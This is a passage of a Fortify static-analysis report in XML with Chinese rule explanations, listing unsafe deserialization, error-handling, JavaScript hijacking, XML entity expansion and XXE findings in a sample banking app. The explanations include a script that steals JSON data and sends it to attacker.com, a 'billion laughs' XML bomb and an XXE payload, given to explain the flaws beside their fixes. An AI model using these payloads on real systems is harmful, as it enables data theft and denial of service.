</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>如果可能，在没有验证对象流的内容的情况下，请勿对不可信数据进行反序列化。为了验证要进行反序列化的类，应使用前瞻反序列化模式。

对象流首先将包含类描述元数据，然后包含其成员字段的序列化字节。Java 序列化过程可以让开发人员读取类描述，并确定是继续进行对象的反序列化还是中止对象的反序列化。为此，需要在应执行类验证和确认的位置，子类化 java.io.ObjectInputStream 并提供 resolveClass(ObjectStreamClass desc) 方法的自定义实现。

已有易于使用的前瞻模式实现方式，例如 Apache Commons IO (org.apache.commons.io.serialization.ValidatingObjectInputStream)。始终使用严格的白名单方法，以仅允许对预期类型进行反序列化。不建议使用黑名单方法，因为攻击者可以使用许多可用小工具绕过黑名单。此外，请谨记，尽管用于执行代码的某些类已公开，但是还可能存在其他未知或未公开的类，因此，白名单方法始终都是首选方法。应审计白名单中允许的任何类，以确保对其进行反序列化是安全的。

在库或框架中执行反序列化时（例如，使用 JMX、RMI、JMS、HTTP Invoker 时），上述建议并不适用，因为它超出了开发人员的控制范围。在这些情况下，您可能需要确保这些协议满足以下要求：

- 未公开披露。
- 使用身份验证。
- 使用完整性检查。
- 使用加密。

此外，每当应用程序通过 ObjectInputStream 执行反序列化时，Fortify Runtime（Fortify 运行时）都会提供要强制执行的安全控制，以此同时保护应用程序代码以及库和框架代码，防止遭到此类攻击。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 由于 ObjectInputStream 实现中的现有缺陷，以及很难对可能用于执行拒绝服务 (DoS) 攻击的基本类列出黑名单，因此即使实现前瞻 ObjectInputStream 也依然会报告此问题，但其严重性会降为 Medium。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="0A737866A868108DAC36F0B9C1F5934C" ruleID="1010C82F-11C6-44D4-BC5C-84A4EDD1C45C">
                            <Category>Dynamic Code Evaluation: Unsafe Deserialization</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在运行时对用户控制的对象流进行反序列化，会让攻击者有机会在服务器上执行任意代码、滥用应用程序逻辑和/或导致 Denial of Service。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>BannerAdClient.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/webservices/BannerAdClient.java</FilePath>
                                <LineStart>75</LineStart>
                                <Snippet>	{

	    Registry registry = LocateRegistry.getRegistry(host);

	    BannerAdSource stub = (BannerAdSource) registry.lookup("BannerAdSource");</Snippet>
                                <TargetFunction>java.rmi.registry.LocateRegistry.getRegistry()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>BannerAdClient.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/webservices/BannerAdClient.java</FilePath>
                                <LineStart>63</LineStart>
                                <Snippet>

    public static void main(String[] args)

	{</Snippet>
                                <TargetFunction>main(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="506F88E419543F2E628B067FB3119708" ruleID="F07D590E-00AE-4D4F-BD7A-4A658CC24921">
                            <Category>Dynamic Code Evaluation: Unsafe Deserialization</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在运行时对用户控制的对象流进行反序列化，会让攻击者有机会在服务器上执行任意代码、滥用应用程序逻辑和/或导致 Denial of Service。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>BannerAdServer.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/webservices/BannerAdServer.java</FilePath>
                                <LineStart>17</LineStart>
                                <Snippet>

public class BannerAdServer implements BannerAdSource

{</Snippet>
                                <TargetFunction>Remote Bean()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>J2EE Misconfiguration: Incomplete Error Handling</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>Web 应用程序必须针对 java.lang.Throwable 配置默认的错误页面，来处理那些未被捕获的异常，从而防止攻击者通过应用程序容器的内置错误响应来挖掘信息。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>当攻击者浏览网站寻找漏洞时，站点提供信息的数量是攻击成败的关键。如果应用程序向攻击者展示了堆栈踪迹，那么堆栈释放的信息将使攻击者的攻击变得轻而易举。例如，一个堆栈跟踪可能会给攻击者显示 SQL 查询字串、即使用的数据库类型以及应用程序容器的版本。攻击者可以从这些信息中找到这些组件中存在的漏洞。

因此，应用程序应通过配置来指定一个默认的错误页面，以保证应用程序永远不会向攻击者泄漏错误消息。处理标准 HTTP 错误代码是一种简单、有效、安全的做法；完善的配置还会定义一个用于补救的错误处理程序，来捕获应用程序可能抛出的所有异常。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>Web 应用程序必须配置有默认的错误页面。您的 web.xml 文件中应当至少包含以下条目：


&lt;error-page&gt;
   &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
&lt;error-page&gt;
   &lt;error-code&gt;404&lt;/error-code&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
&lt;error-page&gt;
   &lt;error-code&gt;500&lt;/error-code&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="B5047EDA4CE9E282971BCE8388BBF874" ruleID="63D409CD-BFA3-40A1-AAA7-9B400C96DD3A">
                            <Category>J2EE Misconfiguration: Incomplete Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Web 应用程序必须针对 500 错误定义默认的错误页面，以避免攻击者通过应用程序容器的内置错误响应来挖掘信息。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>template_web.xml</FileName>
                                <FilePath>WEB-INF/template_web.xml</FilePath>
                                <LineStart>111</LineStart>
                                <Snippet>   &lt;!--  uncomment this simple error-page   --&gt;
	&lt;error-page&gt;
	  &lt;error-code&gt;404&lt;/error-code&gt;
	  &lt;location&gt;/pages/error.jsp&lt;/location&gt;
	&lt;/error-page&gt; </Snippet>
                                <TargetFunction>/web-app/error-page/error-code()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="967ABD8EE2D75903BC851F33400F8D9A" ruleID="7369617C-E2D6-461C-BEE4-66A4A139BDA7">
                            <Category>J2EE Misconfiguration: Incomplete Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Web 应用程序必须针对 java.lang.Throwable 配置默认的错误页面，来处理那些未被捕获的异常，从而防止攻击者通过应用程序容器的内置错误响应来挖掘信息。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>template_web.xml</FileName>
                                <FilePath>WEB-INF/template_web.xml</FilePath>
                                <LineStart>110</LineStart>
                                <Snippet>
   &lt;!--  uncomment this simple error-page   --&gt;
	&lt;error-page&gt;
	  &lt;error-code&gt;404&lt;/error-code&gt;
	  &lt;location&gt;/pages/error.jsp&lt;/location&gt;</Snippet>
                                <TargetFunction>/web-app/error-page/exception-type()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>JavaScript Hijacking</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>使用 JavaScript 符号来传送敏感数据的应用程序可能会存在 JavaScript hijacking 的漏洞，该漏洞允许未经授权的攻击者从一个易受攻击的应用程序中读取机密数据。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>如果发生以下情况，应用程序可能会很容易受到 JavaScript 劫持的攻击：1) 将 JavaScript 对象用作数据传输格式 2) 处理机密数据。由于 JavaScript 劫持漏洞不会作为编码错误的直接结果出现，所以 Fortify 安全编码规则包会通过识别在 HTTP 响应中产生的 JavaScript 代码，引起人们对潜在的 JavaScript 劫持漏洞的注意。

Web 浏览器执行同源策略 (Same Origin Policy)，以保护用户免受恶意网站的攻击。同源策略 (Same Origin Policy) 规定：如果要使用 JavaScript 来访问某个网页的内容的话，则 JavaScript 和网页必须都来源于相同的域。若不采取同源策略 (Same Origin Policy)，恶意网站便可以使用客户端凭证来运行 JavaScript，从其他网站加载的敏感信息，并对这些信息进行提炼，然后将其返回给攻击者。通过 JavaScript 劫持，攻击者可以绕过 Web 应用程序中使用的同源策略 (Same Origin Policy)，该应用程序使用 JavaScript 来交流机密信息。同源策略 (Same Origin Policy) 中的漏洞是：通过这一策略，任何网站的 JavaScript 都可以被其他网站的上下文包含或执行。即使恶意网站不能直接在客户端上检查易受攻击的站点中加载的所有数据，但它仍可以通过配置一个特定的环境利用该漏洞。有了这样的环境，恶意网站就可以监视 JavaScript 的执行过程和任何可能发生的相关负面效应。由于许多 Web 2.0 应用程序使用 JavaScript 作为数据传输机制，因此，与传统的 Web 应用程序不同，它们往往很容易受到各种攻击。

JavaScript 中最常见的信息传输格式为 JavaScript Object Notation (JSON)。JSON RFC 将 JSON 语法定义为 JavaScript 类实例文本化定义语法 (object literal syntax)的子集。JSON 基于两种数据结构类型：阵列和对象。所有可以作为一个或多个有效 JavaScript 语句进行解析的数据传送格式都容易受到 JavaScript 劫持的攻击。JSON 使 JavaScript 劫持变得更加容易，因为 JSON 数组坚持认为它自己就是有效的 JavaScript 指令。因为数组是交换列表的一种正常形式，在应用程序需要交换多个值时会普遍使用该形式。换句话说，一个 JSON 数组会直接受到 JavaScript 劫持的攻击。一个 JSON 对象只在其被一些其他 JavaScript 结构包围时才会受到攻击，这些 JavaScript 结构坚持认为它们自己就是有效的 JavaScript 指令。

示例 1：在以下示例中，开头显示了一个在 Web 应用程序的客户端和服务器组件之间进行的合法 JSON 交互，这一 Web 应用程序用于管理潜在商机。接下来，它说明了攻击者如何模仿客户端获取服务器端返回的机密信息。注意，本例子是专为基于 Mozilla 的浏览器而编写的代码。若在创建对象时，没有使用 new 运算符，则其他主流浏览器会禁止重载默认构造函数。

客户端向服务器请求数据，并通过以下代码评估 JSON 结果：

var object;
var req = new XMLHttpRequest();
req.open("GET", "/object.json",true);
req.onreadystatechange = function () {
  if (req.readyState == 4) {
    var txt = req.responseText;
    object = eval("(" + txt + ")");
    req = null;
  }
};
req.send(null);


当此代码运行时，它会生成一个如下所示的 HTTP 请求：


GET /object.json HTTP/1.1
...
Host: www.example.com
Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR


（在本 HTTP 响应和随后的响应中，我们省略了与该解释没有直接关系的 HTTP 头信息。）
服务器使用 JSON 格式的数组进行响应：


HTTP/1.1 200 OK
Cache-control: private
Content-Type: text/JavaScript; charset=utf-8
...
[{"fname":"Brian", "lname":"Chess", "phone":"6502135600",
  "purchases":60000.00, "email":"brian@example.com" },
 {"fname":"Katrina", "lname":"O'Neil", "phone":"6502135600",
  "purchases":120000.00, "email":"katrina@example.com" },
 {"fname":"Jacob", "lname":"West", "phone":"6502135600",
  "purchases":45000.00, "email":"jacob@example.com" }]


这种情况下，JSON 中包含了与当前用户相关的机密信息（一组潜在商机数据）。其他用户如果不知道该用户的会话标识符，便无法访问这些信息。（在大多数现代 Web 应用程序中，会话标识符存储在 cookie 中。）然而，如果受害者访问某个恶意网站，恶意网站就可以使用 JavaScript 劫持提取信息。如果受害者受到欺骗后，访问包含以下恶意代码的网页，受害者的重要信息就会被发送到攻击者的网站中。


&lt;script&gt;
// override the constructor used to create all objects so
// that whenever the "email" field is set, the method
// captureObject() will run. Since "email" is the final field,
// this will allow us to steal the whole object.
function Object() {
 this.email setter = captureObject;
}

// Send the captured object back to the attacker's web site
function captureObject(x) {
  var objString = "";
  for (fld in this) {
    objString += fld + ": " + this[fld] + ", ";
  }
  objString += "email: " + x;
  var req = new XMLHttpRequest();
  req.open("GET", "http://attacker.com?obj=" +
           escape(objString),true);
  req.send(null);
}
&lt;/script&gt;

&lt;!-- Use a script tag to bring in victim's data --&gt;
&lt;script src="http://www.example.com/object.json"&gt;&lt;/script&gt;


恶意代码使用脚本标签以在当前页面包含 JSON 对象。Web 浏览器将使用该请求发送相应的会话 cookie。换言之，处理此请求时将认为其源自合法应用程序。

当 JSON 阵列到达客户端时，将在恶意页面的上下文中对其进行评估。为了看清 JSON 的评估，恶意页面重新定义了用于创建新对象的 JavaScript 功能。通过此方法，恶意代码已插入一个钩子，该钩子允许其访问每个对象的创建并将对象的内容传递回恶意网站。与之相反，其他攻击可能会覆盖阵列默认的构造函数。为在混合应用中使用而建的应用程序有时会在每一 JavaScript 消息的末端调用回调功能。回调功能意味着将由混合应用中的其他应用程序定义。回调功能使 JavaScript 挟持攻击变得容易 -- 攻击者要做的就是定义该功能。应用程序可以是混合应用 - 友好型或安全型，但不可能两者兼备。如果用户未登录到易受攻击的网站，攻击者可以要求用户登录，然后显示该应用程序的合法登录页面。

这不是钓鱼攻击 -- 攻击者未获得用户凭证的访问权限 -- 因此反钓鱼对策将无法打败攻击。更复杂的攻击可能会通过使用 JavaScript 动态生成脚本标签，向应用程序作出一系列请求。此相同技术有时会用于创建应用程序混合应用。唯一的不同是，在此混合应用情况中，涉及的应用程序之一是恶意的。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>所有使用 JavaScript 进行交流的程序需要采取以下防范措施：1) 拒绝恶意请求：— 在每个返回给 JavaScript 的请求中使用一些令人难以猜测的标识符，如会话标识符。允许服务器验证请求的来源可以防范跨站点请求的伪装攻击。2) 避免直接执行 JavaScript 响应：包括某些响应中的字符，这些响应只有经过了修改，才能成功地转到 JavaScript 解释器进行处理。这样可以防止攻击者使用 &lt;script&gt; 标签看清 JavaScript 的执行过程。防范 JavaScript 劫持的最佳方法是同时采取上述两种防范策略。

拒绝恶意请求
从服务器的角度来看，JavaScript 劫持攻击类似于跨站点伪装请求，因此，防止跨站点伪装请求也就可以防止 JavaScript 劫持攻击。为了便于探测各种恶意请求，每个请求均应包含攻击者难以猜测的参数。一种方法是将会话 cookie 作为参数添加到请求中。服务器接收到这样一个请求时，它可以检查并确定会话 cookie 是否与请求中的参数值匹配。恶意代码无法取得会话 cookie（cookie 也需要遵循同源策略 (Same Origin Policy)），因此，攻击者即使制造了请求，也很难再通过检验了。也可以使用其他机密信息代替会话 cookie；只要这个机密信息难以猜测，可以在合法应用程序能够访问的上下文中使用，同时又无法通过其他的域进行访问，就可以防止攻击者制造有效的请求。

有一些框架仅能运行在客户端上。换言之，它们完全由 JavaScript 编写而成，对服务器的工作情况一无所知。这意味着它们并不知道会话 cookie 的名称。即使并不清楚会话 cookie 的名称，它们也能参与基于 cookie 的防范，途径就是将所有的 cookie 附加到发送给服务器的各个请求中。

示例 2：以下 JavaScript 片段描述了这种“盲客户端”策略：

  var httpRequest = new XMLHttpRequest();
  ...
  var cookies="cookies="+escape(document.cookie);
  http_request.open('POST', url, true);
  httpRequest.send(cookies);


服务器也可以检查 HTTP referer 头信息，以确保请求来自于合法的应用程序，而不是恶意的应用程序。从历史上看，referer 头信息一直都未受到过信任，因此，我们并不建议您将它作为安全机制的基础。您可以为服务器装入一种针对 JavaScript hijacking 的防范方法，即让服务器只对 HTTP POST 请求做出响应，而不回应任何 HTTP GET 请求。这是一项防御技术，原因是 &lt;script&gt; 标签通常使用 GET 方法从外部资源文件中加载 JavaScript。然而，这种防范措施并非尽善尽美。Web 应用程序的专家一致鼓励采用 GET 方法提高性能。如果在 HTTP 方法的选择上缺乏安全方面的考虑，这意味着未来的某一时刻，程序员可能会误认为这种功能上的不足是疏忽所致，而没有将它作为一种安全预警加以认识，进而修改了应用程序以响应 GET 请求。

防止直接执行响应
为了使恶意站点无法执行包含 JavaScript 的响应，合法的客户端应用程序可以利用允许执行前对接收的数据进行修改这一权限，而恶意的应用程序则只能使用 &lt;script&gt; 标签执行响应。当服务器序列化某个对象时，该对象应包括一个前缀（也可以是后缀），从而使它无法通过 &lt;script&gt; 标签执行 JavaScript。合法的客户端应用程序可以在运行 JavaScript 前删除这些无关的数据。

例 3：该方法可以通过多种方式来实现。以下例子演示了两种方式。第一种，服务器可以把以下指令作为消息的前缀：


while(1);


除非客户端删除此前缀，否则对此消息求值会将 JavaScript 解释器置于一个无限循环中。客户端会搜索并删除如下前缀：


var object;
var req = new XMLHttpRequest();
req.open("GET", "/object.json",true);
req.onreadystatechange = function () {
  if (req.readyState == 4) {
    var txt = req.responseText;
    if (txt.substr(0,9) == "while(1);") {
      txt = txt.substring(10);
    }
    object = eval("(" + txt + ")");
    req = null;
  }
};
req.send(null);


第二种，服务器可以在 JavaScript 附近加注注释字符，这些注释字符必须在 JavaScript 被送往 eval() 函数前删除。以下 JSON 对象已加入了一块注释：


/*
[{"fname":"Brian", "lname":"Chess", "phone":"6502135600",
  "purchases":60000.00, "email":"brian@example.com" }
]
*/


客户端可以搜索并删除如下注释字符：


var object;
var req = new XMLHttpRequest();
req.open("GET", "/object.json",true);
req.onreadystatechange = function () {
  if (req.readyState == 4) {
    var txt = req.responseText;
    if (txt.substr(0,2) == "/*") {
      txt = txt.substring(2, txt.length - 2);
    }
    object = eval("(" + txt + ")");
    req = null;
  }
};
req.send(null);


任何通过 &lt;script&gt; 标签来提取敏感 JavaScript 的恶意站点都将无法获取其中所包含的数据。

自第 5 版 EcmaScript 起，已不可能攻击 JavaScript 数组构造函数。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="7DFAB0761E75C7195F4CD615338FA9E8" ruleID="D95A106D-5C95-433B-96C3-76E69BBF5C38">
                            <Category>JavaScript Hijacking</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>使用 JavaScript 符号来传送敏感数据的应用程序可能会存在 JavaScript hijacking 的漏洞，该漏洞允许未经授权的攻击者从一个易受攻击的应用程序中读取机密数据。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>DeleteAccount.jsp</FileName>
                                <FilePath>pages/content/oper/DeleteAccount.jsp</FilePath>
                                <LineStart>52</LineStart>
                                <Snippet>            }

            this.xmlhttp.open("GET",this.resource_url,true);
            this.xmlhttp.send(null);
        }</Snippet>
                                <TargetFunction>FunctionPointerCall: open()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7918DA70F4B489F82D0A0DDD236EF1C9" ruleID="D95A106D-5C95-433B-96C3-76E69BBF5C38">
                            <Category>JavaScript Hijacking</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>使用 JavaScript 符号来传送敏感数据的应用程序可能会存在 JavaScript hijacking 的漏洞，该漏洞允许未经授权的攻击者从一个易受攻击的应用程序中读取机密数据。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>BrowseAccount.jsp</FileName>
                                <FilePath>pages/content/oper/BrowseAccount.jsp</FilePath>
                                <LineStart>27</LineStart>
                                <Snippet>            }

            this.xmlhttp.open("GET",this.resource_url,true);
            this.xmlhttp.send(null);
        }</Snippet>
                                <TargetFunction>FunctionPointerCall: open()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>XML Entity Expansion Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>XMLUtil.java:29 中配置的 XML 解析器无法预防和限制文档类型定义 (DTD) 实体解析。这会使解析器暴露在 XML Entity Expansion injection 之下.</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>XML Entity Expansion Injection 也称为 XML Bombs，属于 Denial of Service (DoS) 攻击，利用格式工整的有效 XML 块，它们在耗尽服务器分配的资源之前不断呈指数式扩张。XML 允许定义充当字符串替代宏的自定义实体。通过嵌套复发性实体解析，攻击者可以轻松使服务器资源崩溃。

下面的 XML 文档介绍了 XML Bomb 的示例。

&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE lolz [
  &lt;!ENTITY lol "lol"&gt;
  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;


此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>应该对 XML 解析器进行安全配置，使它不允许将文档类型定义 (DTD) 自定义实体包含在传入的 XML 文档中。

为了避免 XML Entity Expansion injection，应为 XML 代理、解析器或读取器设置“secure-processing”属性：

factory.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);


在 JAXP 1.3 及更早版本中，当开启安全处理功能时，将为 DOM 和 SAX 解析器设置默认限制。这些限制是：

entityExpansionLimit = 64,000
elementAttributeLimit = 10,000

从 JAXP 1.4 开始，将默认打开安全处理功能。除了上述限制外，还向验证解析器添加了新的 maxOccur 限制。此限制是：

maxOccur = 5,000


如果不需要 inline DOCTYPE 声明，可使用以下属性将其完全禁用：

factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="B4C0ED1FDEDD5205B84C121A792F14C9" ruleID="1C2401A4-37A8-4B2E-9D0A-F03CB933D522">
                            <Category>XML Entity Expansion Injection</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>XMLUtil.java:29 中配置的 XML 解析器无法预防和限制文档类型定义 (DTD) 实体解析。这会使解析器暴露在 XML Entity Expansion injection 之下.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
                                <FileName>XMLUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/XMLUtil.java</FilePath>
                                <LineStart>29</LineStart>
                                <Snippet>            factory = DocumentBuilderFactory.newInstance();
            factory.setNamespaceAware(true);
            return factory.newDocumentBuilder().parse(new InputSource(new StringReader(xml)));
        }
        catch (SAXException ex)</Snippet>
                                <TargetFunction>javax.xml.parsers.DocumentBuilder.parse()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/AccountResources.java</FilePath>
                                <LineStart>124</LineStart>
                                <Snippet>    @Produces("application/xml")
    @Consumes("application/xml")
    public String WriteCheck(String representation) {
        try {
          String username = XMLUtil.GetValueXML(representation, "transaction", "payee");</Snippet>
                                <TargetFunction>WriteCheck(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5EB4340D9D3D3233D0F3131732BA1F09" ruleID="1C2401A4-37A8-4B2E-9D0A-F03CB933D522">
                            <Category>XML Entity Expansion Injection</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>XMLUtil.java:29 中配置的 XML 解析器无法预防和限制文档类型定义 (DTD) 实体解析。这会使解析器暴露在 XML Entity Expansion injection 之下.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
                                <FileName>XMLUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/XMLUtil.java</FilePath>
                                <LineStart>29</LineStart>
                                <Snippet>            factory = DocumentBuilderFactory.newInstance();
            factory.setNamespaceAware(true);
            return factory.newDocumentBuilder().parse(new InputSource(new StringReader(xml)));
        }
        catch (SAXException ex)</Snippet>
                                <TargetFunction>javax.xml.parsers.DocumentBuilder.parse()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/AccountResources.java</FilePath>
                                <LineStart>102</LineStart>
                                <Snippet>    @Produces("application/xml")
    @Consumes("application/xml")
    public String AddAccount(String representation) {
        try {
            String username;</Snippet>
                                <TargetFunction>AddAccount(0)</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>XML External Entity Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>XMLUtil.java:29 中配置的 XML 解析器无法预防和限制外部实体进行解析。这会使解析器暴露在 XML External Entities 攻击之下.</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>XML External Entities 攻击可利用能够在处理时动态构建文档的 XML 功能。XML 实体可动态包含来自给定资源的数据。外部实体允许 XML 文档包含来自外部 URI 的数据。除非另行配置，否则外部实体会迫使 XML 解析器访问由 URI 指定的资源，例如位于本地计算机或远程系统上的某个文件。这一行为会将应用程序暴露给 XML External Entity (XXE) 攻击，从而用于拒绝本地系统的服务，获取对本地计算机上文件未经授权的访问权限，扫描远程计算机，并拒绝远程系统的服务。

下面的 XML 文档介绍了 XXE 攻击的示例。

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
 &lt;!DOCTYPE foo [
  &lt;!ELEMENT foo ANY &gt;
  &lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;


如果 XML 解析器尝试使用 /dev/random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
